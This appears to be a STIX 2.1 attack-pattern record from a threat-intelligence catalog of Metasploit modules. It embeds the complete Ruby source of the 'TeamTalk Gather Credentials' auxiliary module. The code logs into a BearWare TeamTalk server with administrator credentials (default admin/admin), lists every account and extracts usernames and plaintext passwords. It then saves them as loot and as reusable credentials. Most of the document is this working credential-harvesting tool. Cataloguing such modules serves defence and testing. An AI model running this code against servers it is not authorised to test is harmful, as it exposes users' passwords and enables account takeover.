{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--11589342-db6f-4b12-9f89-af468ed2a87b",
    "created": "2024-08-14T16:31:54.190854Z",
    "modified": "2024-08-14T16:31:54.190859Z",
    "name": "TeamTalk Gather Credentials",
    "description": " This module retrieves user credentials from BearWare TeamTalk.  Valid administrator credentials are required.  This module has been tested successfully on TeamTalk versions 5.2.2.4885 and 5.2.3.4893. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/teamtalk_creds.rb",
            "external_id": "teamtalk_creds.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/BearWare/TeamTalk5/blob/master/ttphpadmin/tt5admin.php"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'TeamTalk Gather Credentials',\n      'Description' => %q{\n        This module retrieves user credentials from BearWare TeamTalk.\n\n        Valid administrator credentials are required.\n\n        This module has been tested successfully on TeamTalk versions\n        5.2.2.4885 and 5.2.3.4893.\n      },\n      'Author'      => 'bcoles',\n      'References'  =>\n        [\n          # Protocol documentation\n          ['URL', 'https://github.com/BearWare/TeamTalk5/blob/master/ttphpadmin/tt5admin.php']\n        ],\n      'License'     => MSF_LICENSE))\n    register_options [\n      Opt::RPORT(10333),\n      OptString.new('USERNAME', [true, 'The username for TeamTalk', 'admin']),\n      OptString.new('PASSWORD', [true, 'The password for the specified username', 'admin'])\n    ]\n  end\n\n  def run\n    vprint_status 'Connecting...'\n\n    connect\n    banner = sock.get_once\n\n    unless banner =~ /^teamtalk\\s.*protocol=\"([\\d\\.]+)\"/\n      fail_with Failure::BadConfig, 'TeamTalk does not appear to be running'\n    end\n\n    print_status \"Found TeamTalk (protocol version #{$1})\"\n\n    report_service :host  => rhost,\n                   :port  => rport,\n                   :proto => 'tcp',\n                   :name  => 'teamtalk'\n\n    vprint_status \"Authenticating as '#{username}'\"\n\n    req = \"login username=\\\"#{username.tr('\"', '\\\"')}\\\" password=\\\"#{password.tr('\"', '\\\"')}\\\"\"\n    res = send_command req\n\n    unless res.to_s.starts_with? 'accepted'\n      fail_with Failure::NoAccess, 'Authentication failed'\n    end\n\n    print_good 'Authenticated successfully'\n\n    if res =~ /usertype=2/\n      print_good 'User is an administrator'\n    else\n      print_warning 'User is not an administrator'\n    end\n\n    vprint_status \"Retrieving users...\"\n\n    res = send_command 'listaccounts'\n\n    if res =~ /^error/ && res =~ /message=\"Command not authorized\"/\n      print_error 'Insufficient privileges'\n      return\n    end\n\n    unless res =~ /^ok\\r?\\n?\\z/\n      print_error 'Unexpected reply'\n      return\n    end\n\n    cred_table = Rex::Text::Table.new 'Header'  => 'TeamTalk User Credentials',\n                                      'Indent'  => 1,\n                                      'Columns' => ['Username', 'Password', 'Type']\n\n    res.each_line do |line|\n      line.chomp!\n      next unless line =~ /^useraccount/\n\n      user = line.scan(/\\s+username=\"(.*?)\"\\s+password=/).flatten.first.to_s.gsub('\\\"', '\"')\n      pass = line.scan(/\\s+password=\"(.*?)\"\\s+usertype=/).flatten.first.to_s.gsub('\\\"', '\"')\n      type = line.scan(/\\s+usertype=(\\d+)\\s+/).flatten.first\n\n      cred_table << [ user, pass, type ]\n      report_cred user:     user,\n                  password: pass,\n                  type:     type,\n                  proof:    line\n    end\n\n    if cred_table.rows.empty?\n      print_error 'Did not find any users'\n      return\n    end\n\n    print_status \"Found #{cred_table.rows.size} users\"\n    print_line\n    print_line cred_table.to_s\n\n    p = store_loot 'teamtalk.user.creds',\n                   'text/csv',\n                   rhost,\n                   cred_table.to_csv,\n                   'TeamTalk User Credentials'\n\n    print_good \"Credentials saved in: #{p}\"\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e\n    print_error e.message\n  ensure\n    disconnect\n  end\n\n  private\n\n  def username\n    datastore['USERNAME'] || ''\n  end\n\n  def password\n    datastore['PASSWORD'] || ''\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address:      rhost,\n      port:         rport,\n      service_name: 'teamtalk',\n      protocol:     'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type:     :service,\n      module_fullname: fullname,\n      username:        opts[:user],\n      private_data:    opts[:password],\n      private_type:    :password\n    }.merge service_data\n\n    login_data = {\n      core:              create_credential(credential_data),\n      status:            Metasploit::Model::Login::Status::UNTRIED,\n      access_level:      opts[:type],\n      proof:             opts[:proof]\n    }.merge service_data\n\n    create_credential_login login_data\n  end\n\n  def send_command(cmd = '')\n    cmd_id = rand(1000)\n    sock.put \"#{cmd} id=#{cmd_id}\\n\"\n\n    res = ''\n    timeout = 15\n    Timeout.timeout(timeout) do\n      res << sock.get_once until res =~ /^end id=#{cmd_id}/\n    end\n\n    res.to_s.scan(/begin id=#{cmd_id}\\r?\\n(.*)\\r?\\nend id=#{cmd_id}/m).flatten.first\n  rescue Timeout::Error\n    print_error \"Timeout (#{timeout} seconds)\"\n  rescue => e\n    print_error e.message\n  end\nend\n"
}